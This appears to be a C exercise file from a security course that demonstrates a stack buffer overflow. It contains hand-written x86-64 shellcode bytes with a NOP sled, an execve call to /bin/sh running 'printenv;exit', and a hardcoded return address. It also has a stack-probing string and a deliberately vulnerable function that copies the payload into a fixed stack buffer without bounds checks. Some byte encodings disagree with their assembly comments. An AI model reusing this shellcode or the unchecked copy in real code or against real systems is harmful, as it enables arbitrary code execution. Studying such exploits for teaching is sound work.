#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// Variable to contain hex bytes of shell code
char compromise[161] = {
                                             //  bits 64
     //8 ; two nop matching size in selfcomp.c
     //16
     0x90,0x90,0x90,//24
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//32
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//40
    //-4
                                            //   bits 64
                                             //       ; find out where we are
    0xEB, 0x62,                    		    //42 start:     jmp short codeEnd
    0x5E,                     				//43 start2:    pop rsi
                                            //            ; clear the a register
    0xB8,              					    //44           mov rax,0x0
                                            //            ; restore null bytes to data
    0x88, 0x46, 0x07,                  	    //47           mov [byte rsi+flagStr-exeStr-2],al
    0x88, 0x46, 0x0B,                  	    //50           mov [byte rsi+cmdStr-exeStr-1],al
    0x88, 0x46, 0x19,                  	    //53           mov [byte rsi+arrayAddr-exeStr-1],al
    0x48, 0x89, 0x46, 0x32,                 //57           mov [byte rsi+arrayAddr-exeStr+24],rax
                                            //           
                                            //            ; restore argv
                                            //            
    0x48, 0x89, 0x76, 0x1A,                 //61           mov [byte rsi + arrayAddr - exeStr],rsi
    0x48, 0x8D, 0x7E, 0x09,                 //65           lea rdi,[byte rsi + flagStr - exeStr] 
    0x48, 0x89, 0x7E, 0x1E,                 //69           mov [byte rsi + arrayAddr - exeStr + 4],rdi
    0x48, 0x8D, 0x7E, 0x0C,                 //73           lea rdi, [byte rsi + cmdStr - exeStr]
    0x48, 0x89, 0x7E, 0x22,                 //77           mov [byte rsi + arrayAddr - exeStr + 8],rdi
    
                                            //            ; execve system call
    0xB0, 0x3B,                 			//79           mov al,0x3b
    0x48, 0xBF,                 		  	//81           mov rdi,exeStr
        
    0x48, 0xBE,                   			//83           mov rsi,arrayAddr
        
    0x48, 0x89, 0xE2,                  	    //86           mov rdx,rsp
    0x48, 0xC1, 0xEA, 0x20,                 //90           shr rdx,32
    0x48, 0xC1, 0xE2, 0x20,                 //94           shl rdx,32
    0x48, 0x8B, 0x0C, 0x25,                 //98    
    0x00, 0x56, 0xFB, 0xF7,        		    //102           mov rcx,[0x7ffff7fb5600]
      //488B0C250056FBF7                                              
    0x48, 0x09, 0xCA,                   	//105           or  rdx,rcx
    0x48, 0x8D, 0x3A,                   	//108           lea rdi,[rdx]
    0x0F, 0x05,                    		    //110           syscall
                                            //
                                            //            ; exit system call
    0x48, 0x89, 0xC7,                   	//113           mov rdi,rax
    0x48, 0x31, 0xC0,                   	//116           xor rax,rax
    0xB0, 0x3C,                    		    //118           mov al,0x3c
    0x0F, 0x05,                    		    //120           syscall
                                            //
    0xE8, 0x99, 0xFF, 0xFF, 0xFF,           //125codeEnd:   call start2
                                            //            ; data
    0x2F, 0x62, 0x69, 0x6E, 0x2F,           //130
    0x73, 0x68, 0x58, 0x79,      			//134 exeStr:    db "/bin/shXy"
    0x2D, 0x63, 0x58,                  	    //137 flagStr:   db "-cX"
    0x70, 0x72, 0x69, 0x6E, 0x74,           //142
    0x65, 0x6E, 0x76, 0x3B,     			//146 cmdStr:    db "printenv;exitX"
    0x65, 0x78, 0x69, 0x74, 0x58,           //151
    0xFF, 0xFF, 0xFF, 0xFF,                 //155 arrayAddr: dd 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,                 //159           dd 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,                 //162           dd 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,                 //166           dd 0xffffffffffffffff
                                        	//newAddr:   dd newAddr-start
     // ret addy
     0xff,0xff,0xff,0xff,0xff,0x7f,0x00,    //173
    //rsp = 0x7fffffffdb98 - 0x98 0x93 = 0x7fffffffdb1b
};

// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"//20
    "xxxxxxxxxxxxxxxxxxxx"//40
    "xxxxxxxxxxxxxxxxxxxx"//60
    "xxxxxxxxxxxxxxxxxxxx"//80
    "xxxxxxxxxxxxxxxxxxxx"//100
    "xxxxxxxxxxxxxxxxxxxx"//120
    "xxxxxxxxxxxxxxxxxxxx"//140 
    "xxxx"
    "\x4d\x4e\x4f\x50\x57\x58\x59\x5a"  //0x4d4e4f505758595a
    "xxxxxxxx"; 
     //0x7fffffffdb98 - 81 == 0x7fffffffdb47
    // environ == 0x7ffff7fb5600

int i;
void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

